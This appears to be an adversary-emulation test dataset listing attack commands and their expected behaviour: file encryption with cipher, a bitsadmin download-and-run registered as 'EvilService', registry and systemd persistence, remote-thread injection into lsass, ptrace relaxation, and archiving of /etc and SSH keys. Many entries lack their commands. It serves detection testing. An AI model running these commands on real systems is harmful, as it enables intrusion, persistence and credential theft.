attacks.description: Creates a test file in the TEMP directory and encrypts it using EFS via cipher.exe.
attacks.expected_behavior: A file named sample.txt is created containing 'TestData' and then encrypted; attempts to open it without proper decryption will show garbled content.

attacks.command: cmd.exe /c "mkdir %TEMP%\\enc_folder && echo Secret1 > %TEMP%\\enc_folder\\file1.txt && echo Secret2 > %TEMP%\\enc_folder\\file2.txt && cipher /e %TEMP%\\enc_folder\\*"
attacks.description: Creates a temporary folder with two files and encrypts both files using cipher.exe.
attacks.expected_behavior: Two files (file1.txt, file2.txt) are created with sample content and then encrypted; they become unreadable without decryption.

attacks.description: Recursively encrypts all files within the previously created temporary folder using cipher.exe.
attacks.expected_behavior: All files under %TEMP%\enc_folder (including any subfolders) are encrypted, rendering their contents inaccessible without proper decryption.

attacks.description: Encrypt a single test file using OpenSSL with AES‑256‑CBC and a static password.
attacks.expected_behavior: Creates /tmp/target.txt.enc containing the encrypted version of /tmp/target.txt; original file remains unchanged.

attacks.description: Create a password‑protected zip archive of a directory, encrypting all contained files.
attacks.expected_behavior: Generates /tmp/encrypted_archive.zip containing the encrypted contents of /tmp/target_dir; original directory is untouched.

attacks.description: Basic download of a malicious executable via certutil and immediate execution.
attacks.expected_behavior: The payload.exe file is retrieved from the public URL, written to the temporary directory, and then launched, simulating initial access through a vulnerable public‑facing service.

attacks.description: Intermediate scenario: fetch a Base64‑encoded payload, decode it with certutil, and execute the resulting binary.
attacks.expected_behavior: PowerShell downloads a .b64 file from a public server, certutil decodes it to an executable in the temp folder, and the executable is run, emulating a two‑step exploitation workflow.

attacks.command: bitsadmin /transfer myJob /download /priority normal http://example.com/payload.exe %TEMP%\\payload.exe && sc create EvilService binPath= "%TEMP%\\payload.exe" start= auto && sc start EvilService
attacks.description: Advanced exploitation: download payload with bitsadmin, register it as a Windows service using sc.exe, and start the service.
attacks.expected_behavior: The payload is retrieved from a public URL, a new service named EvilService is created pointing to the payload, and the service is started, providing persistent execution after initial compromise.

attacks.description: Basic exploitation attempt: sends a crafted POST request that includes a classic SQL‑injection payload to a public‑facing login page.
attacks.expected_behavior: The web server processes the request and returns a response (e.g., HTTP 200/302). The response may indicate whether the injection was reflected or caused an error, showing that the request reached a vulnerable application.

attacks.description: Intermediate exploitation attempt: delivers an oversized username string to an FTP service via netcat, simulating a buffer‑overflow payload against a public‑facing service.
attacks.expected_behavior: Netcat connects to the FTP port, sends the long USER command, and then closes. The service may respond with an error or disconnect, indicating that the payload reached the vulnerable application.

attacks.description: Advanced exploitation attempt: creates a harmless PHP payload locally and uploads it to a vulnerable file‑upload endpoint using curl, emulating a remote code execution via malicious file upload.
attacks.expected_behavior: The echo command writes a dummy PHP file to /tmp, then curl posts the file to the upload URL. The server response (e.g., HTTP 200) shows that the upload request was accepted, indicating interaction with a public‑facing application that could be vulnerable to file‑upload abuse.

attacks.command: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TestPersistence /t REG_SZ /d \"cmd.exe /c echo Persistence > %TEMP%\\persistence.txt\"
attacks.description: Adds a Run‑key for the current user that executes a harmless echo command at logon, demonstrating persistence via registry modification.
attacks.expected_behavior: A new registry entry is created under HKCU\...\Run. At the next user logon, cmd.exe runs and creates %TEMP%\persistence.txt containing the word "Persistence".

attacks.command: sc create TestService binPath= \"cmd.exe /c echo Service > %TEMP%\\svc.txt\" start= auto
attacks.description: Creates a new Windows service that runs a benign command, illustrating service‑based persistence.
attacks.expected_behavior: A service named TestService is installed and set to start automatically. When the service starts, it creates %TEMP%\svc.txt with the text "Service".

attacks.description: Registers a scheduled task that runs at logon, executing a harmless echo command, showing persistence via task scheduler.
attacks.expected_behavior: A scheduled task named TestTask is created. At the next logon, the task runs and creates %TEMP%\task.txt containing the word "Task".

attacks.description: Creates a simple bash script that logs execution, makes it executable, and registers it in /etc/rc.local so it runs at boot.
attacks.expected_behavior: On the next system boot, rc.local will launch /usr/local/bin/benign.sh, which appends 'rc.local executed' to /tmp/rc_local.log.

attacks.command:
printf '[Unit]
Description=Benign Test Service
After=network.target

[Service]
ExecStart=/usr/local/bin/benign_service.sh
Type=simple

[Install]
WantedBy=multi-user.target
' > /etc/systemd/system/benign.service && printf '#!/bin/bash
echo "service started" >> /tmp/benign_service.log
' > /usr/local/bin/benign_service.sh && chmod +x /usr/local/bin/benign_service.sh && systemctl daemon-reload && systemctl enable benign.service && systemctl start benign.service
attacks.description: Creates a systemd service unit that runs a benign script, enables the service to start at boot, and starts it immediately.
attacks.expected_behavior: systemd registers the new 'benign.service', starts it, and the script writes 'service started' to /tmp/benign_service.log. The service will also start automatically on future boots.

attacks.description: Loads a benign DLL into the regsvr32 process using the /i switch, demonstrating DLL side‑loading process injection.
attacks.expected_behavior: regsvr32 registers the DLL (no actual registration logic) and maps it into its own process memory, simulating process injection without affecting system stability.

attacks.command: powershell -Command "Add-Type -MemberDefinition @'using System; using System.Runtime.InteropServices; public class P { [DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); }'@ -Name \"P\" -Namespace \"Inject\"; $proc = Get-Process notepad; $h = [Inject.P]::OpenProcess(0x1F0FFF,$false,$proc.Id); $addr = [Inject.P]::VirtualAllocEx($h, [IntPtr]::Zero, 0x1000, 0x3000, 0x40); $payload = [Byte[]](0x90,0x90,0xC3); [void][Inject.P]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]([UIntPtr]::Zero)); [void][Inject.P]::CreateRemoteThread($h,$null,0,$addr,$null,0,$null)"
attacks.description: PowerShell compiles a C# helper that opens notepad.exe, allocates memory, writes a harmless NOP‑NOP‑RET payload, and creates a remote thread – a classic remote‑thread injection.
attacks.expected_behavior: The script injects a tiny benign shellcode into the notepad process, causing the remote thread to execute a RET instruction and then exit without visible effect.

attacks.command: powershell -Command "Add-Type -MemberDefinition @'using System; using System.Runtime.InteropServices; public class P { [DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); }'@ -Name \"P\" -Namespace \"Inject\"; $proc = Get-Process lsass; $h = [Inject.P]::OpenProcess(0x1F0FFF,$false,$proc.Id); $addr = [Inject.P]::VirtualAllocEx($h, [IntPtr]::Zero, 0x1000, 0x3000, 0x40); $payload = [Byte[]](0x90,0x90,0xC3); [void][Inject.P]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]([UIntPtr]::Zero)); [void][Inject.P]::CreateRemoteThread($h,$null,0,$addr,$null,0,$null)"
attacks.description: Advanced PowerShell injection targeting the high‑privilege lsass.exe process, requiring administrative rights and demonstrating a high‑impact remote‑thread injection scenario.
attacks.expected_behavior: The script attempts to inject the same benign NOP‑NOP‑RET payload into lsass.exe. Because lsass runs with SYSTEM privileges, the command must be run as Administrator; the injected thread executes harmless code and then returns, leaving the system stable.

attacks.command: sleep 300 & pid=$!; gdb -q -batch -ex \"attach $pid\" -ex 'call (int)system(\"echo injected > /tmp/injection_test\")' -ex detach -ex quit
attacks.description: Basic injection: use gdb to attach to a sleep process and call system() to write a marker file.
attacks.expected_behavior: Creates /tmp/injection_test containing the word 'injected' while the sleep process continues running.

attacks.description: Intermediate injection: gdb calls dlopen() inside the target process to load a user‑controlled shared library.
attacks.expected_behavior: Loads /tmp/inject.so into the address space of the sleep process; if the library contains benign code (e.g., printing a message), that code will execute.

attacks.command: echo 0 > /proc/sys/kernel/yama/ptrace_scope; sleep 300 & pid=$!; dd if=/tmp/payload.bin of=/proc/$pid/mem bs=1 seek=0 conv=notrunc status=none; kill -SIGCONT $pid
attacks.description: Advanced injection: relax ptrace restrictions, then write a raw payload directly into the target process memory via /proc/<pid>/mem.
attacks.expected_behavior: Writes the contents of /tmp/payload.bin into the memory of the sleep process; depending on the payload, this may alter the process's behavior or cause it to terminate.

attacks.description: Creates a plain text file, encodes it to Base64 using certutil (obfuscating the content), and displays the encoded file.
attacks.expected_behavior: A file plain.txt containing 'HelloWorld' is created in %TEMP%, then certutil generates obf.b64 with the Base64 representation, which is printed to the console.

attacks.description: Writes a Base64‑encoded string to a file, decodes it with certutil, and displays the decoded content, demonstrating simple file‑level obfuscation.
attacks.expected_behavior: The file script.b64 contains the Base64 string for "hello world". certutil decodes it to script.txt, which then outputs "hello world".

attacks.description: PowerShell decodes a Base64 string in memory and writes the raw bytes to a file, showing script‑based obfuscation without external tools.
attacks.expected_behavior: A binary file named decoded.bin is created in %TEMP% containing the bytes for "hello world". PowerShell outputs a confirmation message.

attacks.description: Basic obfuscation: a Base64‑encoded script that echoes a harmless message is decoded, saved, made executable, and run.
attacks.expected_behavior: Creates /tmp/obf_basic.sh containing 'echo "Hello World!" > /home/example.txt', executes it, resulting in the file /home/example.txt with the text 'Hello World!'.

attacks.description: Intermediate obfuscation: uses hex‑escaped characters via printf to write a shell script that echoes an obfuscated message.
attacks.expected_behavior: Creates /tmp/obf_intermediate.sh containing a shebang and an echo command that prints 'Obfuscated Hex' to stdout.

attacks.description: Advanced obfuscation: an AES‑encrypted payload (placeholder) is decrypted on‑the‑fly and piped directly to bash, avoiding any clear‑text artifact on disk.
attacks.expected_behavior: Decrypts the dummy payload (which in a real test would contain benign commands) and executes it; here it results in no visible effect but demonstrates the decryption‑and‑execution flow.

attacks.description: Basic archive of a single test file using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: Creates collection.zip in the %TEMP% directory containing testdata.txt. If the source file does not exist, the command fails gracefully.

attacks.description: Intermediate archive of all .log files in the user's AppData folder, ignoring missing files.
attacks.expected_behavior: Creates logs_archive.zip in %TEMP% containing any .log files found in %APPDATA%. If no matching files exist, the archive is empty and no error is displayed.

attacks.command: cmd.exe /c "mkdir \"%temp%\\collected\" 2>nul && echo SampleData > \"%temp%\\collected\\data1.txt\" && echo MoreData > \"%temp%\\collected\\data2.txt\" && makecab \"%temp%\\collected\\*\" \"%temp%\\collected_archive.cab\""
attacks.description: Advanced archive using the legacy makecab utility to bundle a directory of collected files into a .cab archive.
attacks.expected_behavior: Creates a directory %TEMP%\collected, writes two sample text files, and then packages them into collected_archive.cab located in %TEMP%. The command runs without requiring admin rights.

attacks.description: Create a gzip-compressed tar archive of a single test file located in /tmp.
attacks.expected_behavior: A file named archive.tar.gz appears in /tmp containing the collected.txt file.

attacks.description: Recursively zip system log directory and user log files into a single archive.
attacks.expected_behavior: A zip file data_archive.zip is created in /tmp containing the contents of /var/log and any .log files in the user's home directory.

attacks.description: Create a compressed tar archive of system configuration files and the user's SSH keys, excluding temporary files.
attacks.expected_behavior: A compressed archive secure_data.tar.gz is placed in /tmp, containing /etc (excluding *.tmp) and the user's .ssh directory.
